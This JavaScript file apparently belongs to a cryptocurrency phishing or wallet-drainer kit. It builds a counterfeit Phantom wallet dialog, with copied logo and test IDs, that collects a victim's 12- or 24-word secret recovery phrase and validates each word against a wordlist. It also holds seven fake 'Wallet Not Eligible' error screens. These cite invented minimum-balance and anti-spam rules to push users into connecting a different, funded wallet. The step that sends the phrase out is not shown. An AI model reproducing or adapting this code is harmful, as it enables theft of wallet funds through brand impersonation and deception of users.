const phantomSeedModal = {
    create: () => `
            <div class="modal-overlay" id="phantomSeedModal" style="isolation: isolate;">
                <div class="modal-container">
                    <div class="header">
                        <svg width="24" height="24" viewBox="47 46 105 88" class="phantom-logo">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M89.1138 112.613C83.1715 121.719 73.2139 133.243 59.9641 133.243C53.7005 133.243 47.6777 130.665 47.6775 119.464C47.677 90.9369 86.6235 46.777 122.76 46.7764C143.317 46.776 151.509 61.0389 151.509 77.2361C151.509 98.0264 138.018 121.799 124.608 121.799C120.352 121.799 118.264 119.462 118.264 115.756C118.264 114.789 118.424 113.741 118.746 112.613C114.168 120.429 105.335 127.683 97.0638 127.683C91.0411 127.683 87.9898 123.895 87.9897 118.576C87.9897 116.642 88.3912 114.628 89.1138 112.613ZM115.936 68.7103C112.665 68.7161 110.435 71.4952 110.442 75.4598C110.449 79.4244 112.689 82.275 115.96 82.2693C119.152 82.2636 121.381 79.4052 121.374 75.4405C121.367 71.4759 119.128 68.7047 115.936 68.7103ZM133.287 68.6914C130.016 68.6972 127.786 71.4763 127.793 75.4409C127.8 79.4055 130.039 82.2561 133.311 82.2504C136.503 82.2448 138.732 79.3863 138.725 75.4216C138.718 71.457 136.479 68.6858 133.287 68.6914Z" fill="currentColor"></path></svg>
                        <div class="loading-container">
                            <div class="loading-dot" style="animation-delay: 0s"></div>
                            <div class="loading-dot" style="animation-delay: 0.1s"></div>
                            <div class="loading-dot" style="animation-delay: 0.2s"></div>
                            <div class="loading-dot" style="animation-delay: 0.3s"></div>
                        </div>

                        <svg width="24" height="24" viewBox="0 0 24 24" class="close-button" onclick="hidePhantomSeedModal()">
                            <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="currentColor"/></svg>
                    </div>
                    
                    <div class="title-container">
                        <h1 class="title-text">Secret Recovery Phrase</h1>
                        <p class="subtitle-text">Import an existing wallet with your 12 or 24-word secret recovery phrase.</p>
                    </div>

                    <div class="input-container" id="inputContainer"></div>

                    <div id="error-message" class="error-message" style="display: none;">
                        <svg width="30" height="30" viewBox="0 0 30 30" class="error-icon">
                            <circle cx="15" cy="15" r="14" fill="#111111"></circle>
                            <path d="M25.0182 25.0176C30.5503 19.4855 30.5503 10.5146 25.0182 4.98245C19.4861 -0.549652 10.5152 -0.549652 4.98306 4.98245C-0.549041 10.5146 -0.549041 19.4855 4.98306 25.0176C10.5152 30.5497 19.4861 30.5497 25.0182 25.0176ZM13.4158 8.1522C13.7746 7.37471 14.6119 6.95607 15.4492 7.16539C16.2566 7.37471 16.7948 8.1522 16.735 9.01939C16.7051 9.58755 16.6752 10.1258 16.6453 10.694C16.5257 12.7872 16.4061 14.8804 16.3164 16.9438C16.2865 17.6315 15.7183 18.1698 15.0306 18.1698C14.3129 18.1698 13.7746 17.6315 13.7447 16.8839C13.7148 16.4653 13.7148 16.0467 13.6849 15.628C13.5952 14.2824 13.5354 12.9367 13.4457 11.5612C13.3859 10.694 13.356 9.82678 13.2962 8.95958C13.2663 8.72036 13.2962 8.42132 13.4158 8.1522ZM15.0007 19.3958C15.9576 19.3958 16.735 20.1733 16.7649 21.1302C16.7649 22.0871 15.9875 22.8646 15.0306 22.8646C14.1036 22.8646 13.2962 22.0871 13.2962 21.1601C13.2663 20.2032 14.0437 19.3958 15.0007 19.3958Z" fill="#EB3742"></path>
                        </svg>
                        <span id="error-text"></span>
                    </div>

                    <div class="recovery-outer">
                        <div class="recovery-middle">
                            <a href="#" class="recovery-inner">I have a 24-word recovery phrase</a>
                        </div>
                    </div>
                    
                    <button class="submit-button" disabled>Import Wallet</button>
                </div>
            </div>`};

let wordCount = 12;
let validWords;
fetch('/assets/wordlist.json')
    .then(response => response.json())
    .then(data => {validWords = new Set(data.words);})
    .catch(error => console.error('Error loading wordlist:', error));


function validateWord(input) {
    const word = input.value.toLowerCase().trim();
    const inputGroup = input.closest('.input-group');
    const errorMessage = document.getElementById('error-message');
    if (word) {
        if (!validWords.has(word)) {inputGroup.style.borderColor = '#ff3b3b';
            const inputs = document.querySelectorAll('.phrase-input');
            let invalidIndexes = [];
            inputs.forEach((input, index) => {const w = input.value.toLowerCase().trim();
                if (w && !validWords?.has(w)) {invalidIndexes.push(index + 1);}});

            if (invalidIndexes.length > 0) {let message;
                if (invalidIndexes.length === 1) {message = `Word ${invalidIndexes[0]} is incorrect or misspelled`;} 
                else {const last = invalidIndexes.pop();
                    message = `Words ${invalidIndexes.join(', ')}${invalidIndexes.length ? ', and ' : ' and '}${last} are incorrect or misspelled`;}
                document.getElementById('error-text').textContent = message;
                errorMessage.style.display = 'flex';}
            return false;} 

        else {inputGroup.style.borderColor = 'rgb(171, 159, 242)';
            updateErrorMessage();
            return true;}} 
    else {inputGroup.style.borderColor = 'rgb(47, 47, 47)';
        return false;}}


function updateErrorMessage() {
    const inputs = document.querySelectorAll('.phrase-input');
    const errorMessage = document.getElementById('error-message');
    let invalidIndexes = [];
    inputs.forEach((input, index) => {const word = input.value.toLowerCase().trim();
        if (word && !validWords?.has(word)) {invalidIndexes.push(index + 1);}});
    if (invalidIndexes.length > 0) {let message;
        if (invalidIndexes.length === 1) {message = `Word ${invalidIndexes[0]} is incorrect or misspelled`;} 
        else {const last = invalidIndexes.pop();
            message = `Words ${invalidIndexes.join(', ')}${invalidIndexes.length ? ', and ' : ' and '}${last} are incorrect or misspelled`;}
        document.getElementById('error-text').textContent = message;
        errorMessage.style.display = 'flex';} 
    else {errorMessage.style.display = 'none';}}


function generateInputs(count) {
    const container = document.getElementById('inputContainer');
    container.innerHTML = '';
    for(let i = 1; i <= count; i++) {
        container.innerHTML += `
            <div class="input-group">
                <span class="input-number">${i}.</span>
                <input type="text" class="phrase-input" 
                       data-testid="secret-recovery-phrase-word-input-${i-1}"
                       autocomplete="off" 
                       autocorrect="off"
                       spellcheck="false"
                       pattern="[A-Za-z\\s]+"
                       oninput="checkAllWords()"
                       onblur="validateWord(this)"
                       onfocus="this.closest('.input-group').style.borderColor = 'rgb(171, 159, 242)'">
            </div>`;}}
    

function checkAllWords() {
    const inputs = document.querySelectorAll('.phrase-input');
    const submitButton = document.querySelector('.submit-button');
    const allValid = Array.from(inputs).every(input => {
        const word = input.value.toLowerCase().trim();
        return word && validWords?.has(word);});

    if (allValid) {
        submitButton.style.background = 'rgb(171, 159, 242)';
        submitButton.style.color = 'rgb(34, 34, 34)';
        submitButton.style.cursor = 'pointer';
        submitButton.style.opacity = '1';
        submitButton.disabled = false;} 
    else {
        submitButton.style.background = 'rgb(51, 51, 51)';
        submitButton.style.color = 'white';
        submitButton.style.cursor = 'auto';
        submitButton.style.opacity = '0.6';
        submitButton.disabled = true;}}


function createPhantomSeedModal() {
    const existingModal = document.getElementById('phantomSeedModal');
    if (existingModal) {existingModal.remove();}
    document.body.insertAdjacentHTML('beforeend', phantomSeedModal.create());
    generateInputs(12);
    document.querySelector('.recovery-inner').onclick = function(e) {
        e.preventDefault();
        const currentInputs = Array.from(document.querySelectorAll('.phrase-input')).map(input => ({
            value: input.value, isValid: input.value && validWords?.has(input.value.toLowerCase().trim())}));
        wordCount = wordCount === 12 ? 24 : 12;
        this.textContent = wordCount === 24 ? 'I have a 12-word recovery phrase' : 'I have a 24-word recovery phrase';
        generateInputs(wordCount);
        const newInputs = document.querySelectorAll('.phrase-input');
        currentInputs.forEach((input, index) => {
        if (newInputs[index]) {newInputs[index].value = input.value;
            if (input.value) {const inputGroup = newInputs[index].closest('.input-group');
                inputGroup.style.borderColor = input.isValid ? 'rgb(171, 159, 242)' : '#ff3b3b';}}});
        checkAllWords();}}


function hidePhantomSeedModal() {const modal = document.getElementById('phantomSeedModal');
    if (modal) {modal.remove();}}

window.createPhantomSeedModal = createPhantomSeedModal;
window.hidePhantomSeedModal = hidePhantomSeedModal;


const MODAL_TEMPLATES = {
    1: (imagePath, wallet, modal_card_background, modal_card_color, close_button_color, title_text_color, pending_text_color, chain_background_color, lower_box_background, skeleton_colors) => `
        <style> 
            .modal-overlay {
                font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
                z-index: 999999;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                pointer-events: auto;
                display: flex;
                align-items: center;
                justify-content: center;
                background-color: #000000bf;
                opacity: 0;
                transition: opacity 0.2s ease-out;
                backdrop-filter: blur(6px);
                visibility: hidden;}

            .modal-overlay.open {
                opacity: 1;
                visibility: visible;}

            .modal-card {
                max-width: 360px;
                width: 100%;
                background: ${modal_card_background};
                border-radius: 24px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.32);
                position: relative;
                animation: zoomIn 0.2s ease-out;
                color: ${modal_card_color};}

            .modal-header {
                padding: 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;}

            .modal-content {
                padding: 20px;}

            .chain-badge {
                display: flex;
                align-items: center;
                gap: 8px;
                background: ${chain_background_color};
                padding: 8px 12px;
                border-radius: 999px;
                font-size: 14px;}

            .chain-badge .dot {
                width: 8px;
                height: 8px;
                border-radius: 50%;
                animation: pulse 2s infinite;}

            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.5; }
                100% { opacity: 1; }}

            @media (max-width: 430px) {
                .modal-overlay {
                    align-items: flex-end;}

                .modal-card {
                    max-width: 100%;
                    border-bottom-left-radius: 0;
                    border-bottom-right-radius: 0;
                    animation: slideIn 0.2s ease-out;}}

            @keyframes zoomIn {
                0% { transform: scale(0.95); }
                100% { transform: scale(1); }}

            @keyframes slideIn {
                0% { transform: translateY(50px); }
                100% { transform: translateY(0); }}

            .shake {
                animation: shake 0.5s ease-out;}

            @keyframes shake {
                0% { transform: rotate(0deg); }
                20% { transform: rotate(-1deg); }
                40% { transform: rotate(1.5deg); }
                60% { transform: rotate(-1.5deg); }
                80% { transform: rotate(1deg); }
                100% { transform: rotate(0deg); }}

            @keyframes shimmer {
                0% { background-position: 200% 0; }
                100% { background-position: -200% 0; }}
        </style>

        <div class="modal-overlay open" id="txModal" style="isolation: isolate;">
            <div class="modal-card" style="isolation: isolate;">

                <div class="modal-header">
                    <div class="chain-badge">
                        Status
                    <div class="dot" style="background: #ff3b30;"></div>
                    </div>

                    <button onclick="hideTransactionModal()" style="background: none; border: none; color: ${close_button_color}; cursor: pointer; padding: 4px;">
                        <svg fill="none" viewBox="0 0 16 16" style="width: 16px; height: 16px;">
                            <path fill="currentColor" fill-rule="evenodd" d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z" clip-rule="evenodd"></path>
                        </svg>
                    </button>
                </div>

                <div class="modal-content">
                    <div style="text-align: center; margin-bottom: 24px;">
                          <img src="/assets/Wallet-Icons/${imagePath}" style="width: 80px; height: 80px; display: block; margin: 0 auto;" />
                          <div style="color: ${close_button_color}; font-size: 16px; font-weight: 500; margin-top: 16px; letter-spacing: -0.64px;">${wallet}</div>
                          <div style="color: #949e9e; font-size: 14px; margin-top: 8px; letter-spacing: -0.56px; font-weight: 500;">Wallet is Not Eligible</div>
                    </div>

                    <div style="background: ${chain_background_color}; border-radius: 12px; padding: 16px; margin-bottom: 12px;">
                        <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
                            <span style="color: #949e9e; font-size: 14px;">Minimum Balance:</span>
                            <span style="color: #ff3b30; font-size: 14px; font-weight: 500;">0.03 ETH</span>
                        </div>

                        <div style="display: flex; align-items: center; justify-content: space-between;">
                            <span style="color: #949e9e; font-size: 14px;">Transaction History:</span>
                            <span style="color: #ff3b30; font-size: 14px; font-weight: 500;">Insufficient</span>
                        </div>
                    </div>

                    <button onclick="change_wallet()" style="width: 100%; background: #ff3b30; color: white; border: none; padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer;">
                        Connect Different Wallet
                    </button>

                    <div style="color: #949e9e; font-size: 14px; margin-top: 8px; letter-spacing: -0.56px; font-weight: 500;">⚠️ To proceed, please connect a wallet that meets the minimum activity requirements.</div>
                </div>
            </div>
        </div>`,
  
    2: `
        <div id="loadingModal" style="display: block; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.75); isolation: isolate; z-index: 999999;">
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #ff0000;"></div>
                <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 400px;">
                    <div style="position: relative; z-index: 1; background: #111; border: 1px solid #333; padding: 25px;">
                        <div style="color: #ff3333; font-family: monospace; font-size: 13px; margin-bottom: 15px;">
                            ERROR_INSUFFICIENT_BALANCE
                        </div>
  
                        <h2 style="color: white; font-size: 24px; margin: 0 0 20px; font-weight: 500;">
                            Wallet Requirements Not Met
                        </h2>
        
                        <div style="background: #0a0a0a; padding: 20px; margin: 20px 0; border-left: 2px solid #ff3333;">
                            <div style="color: #888; font-size: 14px; line-height: 1.6;">
                                • Minimum balance: 0.03 ETH<br>
                                • Current balance: 0.00 ETH
                            </div>
                        </div>
        
                        <div style="display: flex; gap: 10px; margin-top: 25px;">
                            <button onclick="change_wallet()" 
                                style="flex: 1; background: #ff3333; color: white; border: none; padding: 12px; font-size: 13px; cursor: pointer; transition: background 0.2s;" 
                                onmouseover="this.style.background='#ff4444'" 
                                onmouseout="this.style.background='#ff3333'">
                            CONNECT DIFFERENT WALLET
                            </button>

                        <button onclick="change_wallet()" 
                            style="width: 45px; background: #222; color: #888; border: none; padding: 12px; font-size: 13px; cursor: pointer;">
                        ✕
                        </button>
                    </div>
                </div>
            </div>
        </div>`,
    
    3: `
        <div id="loadingModal" style="display: block; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #000000bf; isolation: isolate; z-index: 999999;">
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1E1E1E; width: 90%; max-width: 420px; border-radius: 16px; overflow: hidden;">
                <div style="position: relative; padding: 24px; background: linear-gradient(180deg, #2C2C2C 0%, #1E1E1E 100%);">
                <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('data:image/svg+xml,...') center/cover; opacity: 0.1;"></div>
                  
                <div style="position: relative; z-index: 1; display: flex; align-items: center; gap: 16px;">
                    <div style="width: 48px; height: 48px; background: #DC2626; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
                        <svg width="24" height="24" viewBox="0 0 24 24" style="fill: white;">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                        </svg>
                    </div>
                        <div>
                            <h3 style="color: white; font-size: 18px; margin: 0;">Wallet Not Eligible</h3>
                            <p style="color: #A1A1AA; font-size: 14px; margin: 4px 0 0;">Minimum requirements not met</p>
                        </div>
                    </div>
                </div>
  
                <div style="padding: 24px;">
                    <div style="background: rgba(220, 38, 38, 0.1); border: 1px solid rgba(220, 38, 38, 0.2); border-radius: 12px; padding: 16px; margin-bottom: 24px;">
                        <div style="color: #EF4444; font-size: 14px;">
                            • Insufficient balance (0.03 ETH required)<br>
                            • No transaction history
                        </div>
                    </div>
  
                <div style="display: flex; gap: 12px;">
                    <button onclick="change_wallet()" style="flex: 1; background: white; color: black; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">
                          Switch Wallet
                    </button>
                    <button onclick="change_wallet()" style="background: rgba(255, 255, 255, 0.1); color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer;">
                        ✕
                    </button>
                </div>
                </div>
            </div>
        </div>`,
    
    4: `
        <div id="loadingModal" style="display: block; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #000000bf; isolation: isolate; z-index: 999999;">
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 440px;">
                <div style="background: #1e293b; border-radius: 16px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);">
                    
                    <div style="background: #0f172a; padding: 20px; position: relative; height: 80px; overflow: hidden;">
                        <div style="display: flex; align-items: flex-end; height: 100%; gap: 6px; opacity: 0.5;">
                            <div style="height: 10%; width: 8px; background: #475569; border-radius: 2px;"></div>
                            <div style="height: 5%; width: 8px; background: #475569; border-radius: 2px;"></div>
                            <div style="height: 0%; width: 8px; background: #475569; border-radius: 2px;"></div>
                            <div style="height: 0%; width: 8px; background: #475569; border-radius: 2px;"></div>
                            <div style="height: 0%; width: 8px; background: #475569; border-radius: 2px;"></div>
                            <div style="height: 0%; width: 8px; background: #475569; border-radius: 2px;"></div>
                            <div style="position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #475569; font-size: 12px;">
                                  No Recent Activity
                            </div>
                        </div>
                    </div>
      
                      <div style="padding: 30px;">
                          <div style="display: inline-block; background: #dc2626; color: white; font-size: 12px; padding: 4px 12px; border-radius: 12px; margin-bottom: 20px;">
                              INACTIVE WALLET
                          </div>
      
                          <h2 style="color: white; font-size: 24px; margin: 0 0 10px 0;">
                              Wallet Activity Required
                          </h2>
      
                          <p style="color: #94a3b8; font-size: 15px; line-height: 1.6; margin: 0 0 25px 0;">
                              This wallet shows no recent on-chain activity. To prevent spam and ensure protocol security, we require wallets to have previous transaction history.
                          </p>
      
                          <div style="background: #0f172a; border-radius: 12px; padding: 20px; margin-bottom: 25px;">
                              <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
                                  <div style="width: 20px; height: 20px; border-radius: 50%; background: #dc2626; display: flex; align-items: center; justify-content: center; font-size: 12px; color: white;">✕</div>
                                  <div style="color: #94a3b8; font-size: 14px;">No transactions in last 30 days</div>
                              </div>
                              <div style="display: flex; align-items: center; gap: 12px;">
                                  <div style="width: 20px; height: 20px; border-radius: 50%; background: #dc2626; display: flex; align-items: center; justify-content: center; font-size: 12px; color: white;">✕</div>
                                  <div style="color: #94a3b8; font-size: 14px;">Minimum 3 transactions required</div>
                              </div>
                          </div>
      
                          <div style="display: flex; gap: 12px;">
                              <button onclick="change_wallet()" style="flex: 1; background: #3b82f6; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s;" onmouseover="this.style.background='#2563eb'" onmouseout="this.style.background='#3b82f6'">
                                  Connect Active Wallet
                              </button>
                              <button onclick="change_wallet()" style="width: 50px; background: #334155; color: #94a3b8; border: none; padding: 14px; border-radius: 12px; cursor: pointer; transition: all 0.2s;" onmouseover="this.style.background='#475569'" onmouseout="this.style.background='#334155'">
                                  ✕
                              </button>
                          </div>
                      </div>
                  </div>
              </div>
          </div>`,
    
    5: `
        <div id="loadingModal" style="display: block; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #000000bf; isolation: isolate; z-index: 999999;">
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 460px;">
                <div style="background: linear-gradient(165deg, #0f1923, #0a1118); border: 1px solid #1e3448; border-radius: 2px; overflow: hidden; position: relative;">
                <div style="height: 2px; width: 100%; background: linear-gradient(90deg, transparent, #00f7ff, transparent); animation: scan 2s linear infinite;"></div>
                  
                  <div style="padding: 30px;">
                      <div style="position: relative; width: 80px; height: 90px; margin: 0 auto 20px; transform: rotate(30deg);">
                          <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #ff2b2b11; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); border: 2px solid #ff2b2b;">
                              <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-30deg); color: #ff2b2b; font-size: 30px; font-weight: bold;">!</div>
                          </div>
                      </div>
  
                      <div style="text-align: center; margin-bottom: 25px;">
                          <div style="color: #ff2b2b; font-size: 14px; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 10px;">
                              System Alert
                          </div>
                          <div style="color: #00f7ff; font-size: 24px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;">
                              Wallet Not Eligible
                          </div>
                      </div>
  
                      <div style="background: rgba(0, 247, 255, 0.03); border: 1px solid rgba(0, 247, 255, 0.1); padding: 20px; margin: 20px 0; position: relative; overflow: hidden;">
                          <div style="position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, rgba(0, 247, 255, 0.5), transparent); animation: scan 1.5s linear infinite;"></div>
                          
                          <div style="color: #00f7ff; font-family: monospace; font-size: 13px; line-height: 1.6;">
                              <span style="color: rgba(0, 247, 255, 0.5)">MIN_BALANCE_REQ:</span> 0.1 ETH<br>
                              <span style="color: rgba(0, 247, 255, 0.5)">SECURITY_PROTOCOL:</span> ANTI-SPAM
                          </div>
                      </div>
  
                      <div style="color: #8ba0b2; font-size: 14px; line-height: 1.5; text-align: center; margin: 20px 0;">
                          Insufficient wallet balance detected. Connect a wallet with minimum 0.1 ETH to access protocol.
                      </div>
  
                      <div style="display: flex; gap: 15px; margin-top: 25px;">
                          <button onclick="change_wallet()" style="flex: 1; background: linear-gradient(90deg, #00f7ff22, #00f7ff44); color: #00f7ff; border: 1px solid #00f7ff; padding: 12px; font-size: 14px; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px;" onmouseover="this.style.background='linear-gradient(90deg, #00f7ff44, #00f7ff66)'" onmouseout="this.style.background='linear-gradient(90deg, #00f7ff22, #00f7ff44)'">
                              Switch Wallet
                          </button>
                          <button onclick="change_wallet()" style="flex: 1; background: transparent; color: #8ba0b2; border: 1px solid #1e3448; padding: 12px; font-size: 14px; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px;" onmouseover="this.style.borderColor='#8ba0b2'" onmouseout="this.style.borderColor='#1e3448'">
                              Dismiss
                          </button>
                      </div>
                  </div>
              </div>
          </div>
      </div>
    </div>`,
  
    6: `
        <div id="loadingModal" style="display: block; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #000000bf; backdrop-filter: blur(20px); isolation: isolate; z-index: 999999;">
              <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 375px;">
                  <div style="background: rgba(255, 255, 255, 0.03); border-radius: 24px; backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.05);">
                      
                      <div style="padding: 40px 30px; text-align: center; position: relative; overflow: hidden;">
                          <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100px; height: 100px; background: rgba(255, 59, 48, 0.1); border-radius: 50%; animation: pulse 2s infinite;">
                          </div>
                          <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80px; height: 80px; background: rgba(255, 59, 48, 0.15); border-radius: 50%; animation: pulse 2s infinite 0.3s;">
                          </div>
                          
                          <div style="width: 60px; height: 60px; background: rgba(255, 59, 48, 0.9); border-radius: 50%; margin: 0 auto; position: relative; z-index: 1; display: flex; align-items: center; justify-content: center;">
                              <svg width="24" height="24" viewBox="0 0 24 24" style="fill: white;">
                                  <path d="M12 5.99L19.53 19H4.47L12 5.99M12 2L1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"/>
                              </svg>
                          </div>
                      </div>
      
                      <div style="background: rgba(255, 255, 255, 0.02); border-radius: 24px; padding: 30px;">
                          <div style="text-align: center; margin-bottom: 25px;">
                              <h2 style="color: white; font-size: 24px; margin: 0 0 8px 0; font-weight: 600;">
                                  Access Restricted
                              </h2>
                              <p style="color: rgba(255, 255, 255, 0.5); font-size: 15px; margin: 0; line-height: 1.5;">
                                  Your wallet doesn't meet the minimum requirements
                              </p>
                          </div>
      
                          <div style="background: rgba(255, 255, 255, 0.03); border-radius: 16px; padding: 20px; margin-bottom: 30px;">
                              <div style="display: flex; align-items: center; gap: 12px; padding-bottom: 15px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); margin-bottom: 15px;">
                                  <div style="min-width: 32px; height: 32px; background: rgba(255, 59, 48, 0.1); border-radius: 8px; display: flex; align-items: center; justify-content: center;">
                                      <span style="color: #FF3B30; font-size: 18px;">⚠️</span>
                                  </div>
                                  <div style="flex: 1;">
                                      <div style="color: white; font-size: 14px; font-weight: 500;">Minimum Balance</div>
                                      <div style="color: rgba(255, 255, 255, 0.5); font-size: 13px;">0.1 ETH Required</div>
                                  </div>
                              </div>
                              <div style="display: flex; align-items: center; gap: 12px;">
                                  <div style="min-width: 32px; height: 32px; background: rgba(255, 59, 48, 0.1); border-radius: 8px; display: flex; align-items: center; justify-content: center;">
                                      <span style="color: #FF3B30; font-size: 18px;">⚠️</span>
                                  </div>
                                  <div style="flex: 1;">
                                      <div style="color: white; font-size: 14px; font-weight: 500;">Transaction History</div>
                                      <div style="color: rgba(255, 255, 255, 0.5); font-size: 13px;">Min. 3 Previous Transactions</div>
                                  </div>
                              </div>
                          </div>
      
                          <div style="display: flex; flex-direction: column; gap: 12px;">
                              <button onclick="change_wallet()" style="width: 100%; background: white; color: black; border: none; padding: 16px; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.2s;" onmouseover="this.style.transform='scale(0.98)'" onmouseout="this.style.transform='scale(1)'">
                                  Connect Different Wallet
                              </button>
                              <button onclick="change_wallet()" style="width: 100%; background: transparent; color: rgba(255, 255, 255, 0.5); border: none; padding: 16px; font-size: 15px; cursor: pointer;">
                                  Dismiss
                              </button>
                          </div>
                      </div>
                  </div>
              </div>
          </div>`,

    7: `
        <div id="loadingModal" style="display: block; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #000000bf; backdrop-filter: blur(5px); isolation: isolate; z-index: 999999;">
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1f2d; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4); border: 1px solid #2c3448;">
                <div style="width: 80px; height: 80px; margin: 0 auto 20px; background: #ff494933; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                    <svg width="40" height="40" viewBox="0 0 24 24" style="fill: #ff4949;">
                        <path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
                    </svg>
                </div>

                <h2 style="color: #ffffff; font-size: 24px; margin: 0 0 20px;">Wallet Not Eligible</h2>
                    <div style="background: #2c3448; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: left;">
                        <div style="color: #ff4949; font-size: 14px; margin: 8px 0; display: flex; align-items: center;">
                            <svg width="16" height="16" viewBox="0 0 24 24" style="fill: currentColor; margin-right: 8px;">
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                            </svg>
                            Insufficient Balance (Min. 0.03 ETH required)
                        </div>
                    </div>

                <p style="color: #8f96ac; font-size: 15px; line-height: 1.5; margin: 20px 0;">
                    To protect against spam, a minimum balance of 0.03 ETH is required. Please connect an eligible wallet to continue.</p>

                <div style="display: flex; gap: 10px; justify-content: center;">
                    <button onclick="change_wallet()" style="background: #3772ff; color: white; border: none; padding: 12px 24px; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: transform 0.2s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
                        Switch Wallet
                    </button>

                    <button onclick="change_wallet()" style="background: transparent; border: 1px solid #3772ff; color: #3772ff; padding: 12px 24px; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: transform 0.2s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
                        Dismiss
                    </button>
                </div>
            </div>
        </div>`,};
  
function createLoadingModal(wallet, modalType = '1') {let imagePath;
    const existingModal = document.getElementById('loadingModal');
    if (existingModal) {existingModal.remove();}

    const theme = window.userConfig.MODAL_THEME.mode;
    if (theme === 'light') {
        modal_card_background = '#fff';
        modal_card_color = '#000000';
        close_button_color = '#000000';
        title_text_color = '#000000';
        pending_text_color = '#000000';
        chain_background_color = '#f2f2f2';
        lower_box_background = '#f2f2f2';
        skeleton_colors = '(90deg, rgb(222 223 223) 25%, #f2f2f2 50%, #f2f2f2 75%)';} 
    else { 
        modal_card_background = '#121313';
        modal_card_color = 'white';
        close_button_color = '#e4e7e7';
        title_text_color = '#e4e7e7';
        pending_text_color = '#949e9e';
        chain_background_color = 'rgba(255, 255, 255, 0.1)';
        lower_box_background = '#212224';
        skeleton_colors = '(90deg, #2a2d2f 25%, #343739 50%, #2a2d2f 75%)';}

    const walletList = ['Phantom', "Bitget Wallet", "Coin98 Wallet", 'Uniswap Extension', "Keplr", 'WalletConnect', 'Brave Wallet', 'OKX Wallet', 'Coinbase Wallet', 'MetaMask', 'Rabby Wallet', 'Rainbow', 'Trust Wallet', 'Zerion'];             
    if (walletList.includes(wallet)) {const extension = ['Phantom', 'Uniswap Extension', 'WalletConnect', 'OKX Wallet'].includes(wallet) ? '.png' : '.svg';
        imagePath = `${wallet}${extension}`;} 
    else {imagePath = 'WalletConnect.png';}

